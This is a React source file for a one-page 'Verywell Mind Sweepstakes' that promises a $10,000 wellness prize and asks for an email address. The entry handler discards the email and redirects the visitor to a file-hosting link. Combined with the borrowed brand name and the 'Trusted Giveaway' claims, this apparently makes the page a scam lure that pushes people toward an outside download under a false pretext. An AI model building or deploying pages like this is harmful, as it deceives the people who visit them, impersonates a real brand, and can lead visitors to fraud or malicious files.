import { type FormEvent, useState } from "react";

export default function App() {
  const [email, setEmail] = useState("");
  const [error, setError] = useState("");

  const submitEntry = (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    const normalizedEmail = email.trim();
    if (normalizedEmail === "") {
      setError("Please enter your email address.");
      return;
    }

    setError("");
    window.location.href = "https://tundrafile.com/1881212";
  };

  return (
    <>
      <style>{`
        body {
          font-family: Arial, Helvetica, sans-serif;
          background: #f5f6fa;
          margin: 0;
        }

        header {
          background: #4caf50;
          color: white;
          padding: 20px;
          text-align: center;
        }

        .container {
          max-width: 700px;
          margin: auto;
          background: white;
          padding: 35px;
          margin-top: 40px;
          border-radius: 8px;
          box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
          text-align: center;
        }

        .prize-box {
          background: #f1f3f6;
          padding: 25px;
          border-radius: 6px;
          margin-bottom: 25px;
        }

        .enter-btn {
          background: #ff6600;
          color: white;
          padding: 15px 35px;
          font-size: 18px;
          border: none;
          border-radius: 5px;
          cursor: pointer;
          margin-top: 10px;
        }

        .enter-btn:hover {
          background: #e65c00;
        }

        .email-input {
          width: 80%;
          padding: 12px;
          margin-top: 15px;
          border-radius: 4px;
          border: 1px solid #ccc;
          font-size: 16px;
        }

        .email-input.error {
          border-color: #c62828;
        }

        .input-label {
          display: block;
          margin-top: 10px;
          font-weight: 700;
        }

        .error-text {
          color: #c62828;
          font-size: 14px;
          margin-top: 8px;
        }

        .features {
          margin-top: 25px;
          text-align: left;
        }

        footer {
          text-align: center;
          font-size: 13px;
          color: #666;
          margin-top: 40px;
          padding-bottom: 16px;
        }
      `}</style>

      <header>
        <h1>Verywell Mind Sweepstakes</h1>
        <p>Refresh your wellness inside &amp; out</p>
      </header>

      <div className="container">
        <div className="prize-box">
          <h2>Enter for a Chance to Win $10,000 💰</h2>

          <p>
            Enter for a chance to win <strong>$10,000</strong> to refresh your
            wellness inside and out!
          </p>

          <p>It only takes a few seconds to enter.</p>

          <form onSubmit={submitEntry} noValidate>
            <label className="input-label" htmlFor="email">
              Email Address
            </label>
            <input
              className={`email-input ${error ? "error" : ""}`}
              type="email"
              placeholder="Enter Email Address"
              id="email"
              name="email"
              value={email}
              onChange={(event) => {
                setEmail(event.target.value);
                if (error) setError("");
              }}
              autoComplete="email"
            />

            {error ? (
              <p className="error-text" role="alert">
                {error}
              </p>
            ) : null}

            <br />

            <button className="enter-btn" type="submit">
              Enter for a Chance to WIN!
            </button>
          </form>
        </div>

        <div className="features">
          <h3>Why Enter?</h3>

          <ul>
            <li>✔ $10,000 Wellness Prize</li>
            <li>✔ Quick &amp; Easy Entry</li>
            <li>✔ Trusted Giveaway Opportunity</li>
            <li>✔ Winner Announced Soon</li>
          </ul>
        </div>
      </div>

      <footer>
        <p>© 2026 Wellness Sweepstakes</p>
        <p>Privacy Policy | Terms of Service</p>
      </footer>
    </>
  );
}
